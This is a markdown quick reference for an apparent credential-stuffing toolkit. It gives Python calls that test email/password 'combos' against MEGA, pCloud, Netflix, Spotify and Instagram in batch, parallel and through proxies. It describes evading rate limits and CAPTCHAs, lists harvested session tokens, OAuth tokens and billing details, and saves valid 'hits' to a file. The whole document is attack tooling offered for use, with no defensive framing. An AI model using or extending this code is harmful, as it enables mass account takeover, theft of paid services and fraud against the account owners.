# Elite Checker Quick Reference

Fast lookup for all elite-tier checkers.

---

## 📦 Import Statements

```python
# Tier 1: Cloud Storage
from checkers.private import MEGAChecker
from checkers.elite import pCloudChecker, MediaFireChecker

# Tier 2: Streaming
from checkers.elite import NetflixChecker, SpotifyChecker, DisneyPlusChecker

# Tier 3: Social/Gaming
from checkers.elite import InstagramChecker, TikTokChecker
```

---

## ⚡ One-Liners

```python
# MEGA (xrisky/xcap/Ox level)
result = await MEGAChecker().check_single("email@example.com", "password")

# pCloud (xrisky/Private)
result = await pCloudChecker().check_single("email@example.com", "password")

# Netflix (xrisky/Darkxcode/xcap)
result = await NetflixChecker().check_single("email@example.com", "password")

# Spotify (xrisky/Ox)
result = await SpotifyChecker().check_single("email@example.com", "password")

# Instagram (Private developers)
result = await InstagramChecker().check_single("username", "password")
```

---

## 🎯 Key Session Data

### MEGA
```python
result.session_data['storage_total']    # 20GB-50GB in bytes
result.session_data['storage_used']     # Used space
result.session_data['file_count']       # Total files
result.session_data['account_type']     # Free/Pro I/II/III/Lite
result.session_data['session_id']       # Session token
```

### pCloud
```python
result.session_data['storage_total']    # 10GB-2TB
result.session_data['crypto_enabled']   # Crypto folder detected
result.session_data['account_type']     # Free/Premium/Premium+
result.session_data['premium_lifetime'] # True/False
result.session_data['file_count']       # Total files
```

### Netflix
```python
result.session_data['plan']             # Basic/Standard/Premium
result.session_data['profiles']         # Profile count
result.session_data['screens']          # 1/2/4 screens
result.session_data['supports_4k']      # True/False
result.session_data['billing_date']     # Next billing
```

### Spotify
```python
result.session_data['product']          # free/premium/family/student
result.session_data['is_premium']       # True/False
result.session_data['followers']        # Follower count
result.session_data['country']          # Country code
result.session_data['access_token']     # OAuth token
```

### Instagram
```python
result.session_data['followers']        # Follower count
result.session_data['following']        # Following count
result.session_data['posts']            # Post count
result.session_data['is_verified']      # Blue checkmark
result.session_data['is_business']      # Business account
```

---

## 💡 Common Patterns

### Basic Check
```python
checker = NetflixChecker()
result = await checker.check_single(email, password)

if result.status == CheckerResult.SUCCESS:
    print(f"✅ Valid: {result.message}")
else:
    print(f"❌ Invalid: {result.status}")
```

### Batch Check
```python
combos = [("user1@email.com", "pass1"), ("user2@email.com", "pass2")]
results = await checker.check_batch(combos)
hits = [r for r in results if r.status == CheckerResult.SUCCESS]
```

### With Proxy
```python
result = await checker.check_single(
    email,
    password,
    proxy="http://proxy.com:8080"
)
```

### Error Handling
```python
if result.status == CheckerResult.RATE_LIMITED:
    await asyncio.sleep(60)
elif result.status == CheckerResult.CAPTCHA:
    # Solve CAPTCHA
    pass
```

---

## 📊 Performance (CPM = Checks Per Minute)

| Checker | CPM | Type |
|---------|-----|------|
| Spotify | 800 | API |
| Instagram | 600 | API |
| MEGA | 500 | API |
| pCloud | 400 | API |
| TikTok | 300 | Browser |
| Netflix | 200 | Browser |

---

## 🔒 Status Codes

```python
SUCCESS       # Valid credentials
INVALID       # Wrong email/password
RATE_LIMITED  # Too many requests
CAPTCHA       # CAPTCHA required
BANNED        # Account suspended
ERROR         # Technical error
```

---

## 🎨 Advanced Examples

### Parallel Checking
```python
tasks = [
    NetflixChecker().check_single(e, p) for e, p in combos
]
results = await asyncio.gather(*tasks)
```

### AI-Enhanced
```python
from core.brain import DecisionEngine

engine = DecisionEngine()
strategy = await engine.decide_checking_strategy('netflix')
result = await checker.check_single(email, password)
```

### Save Hits
```python
hits = []
for email, password in combos:
    result = await checker.check_single(email, password)
    if result.status == CheckerResult.SUCCESS:
        hits.append(f"{email}:{password} | {result.session_data['plan']}")

with open('hits.txt', 'w') as f:
    f.write('\n'.join(hits))
```

---

## 📚 Documentation Links

- Full Guide: `docs/ELITE_CHECKERS.md`
- API Reference: `docs/ELITE_API_GUIDE.md`
- Feature Matrix: `docs/FEATURE_MATRIX.md`
- Implementation: `ELITE_IMPLEMENTATION.md`

---

**Quick reference for elite-tier credential checking.**
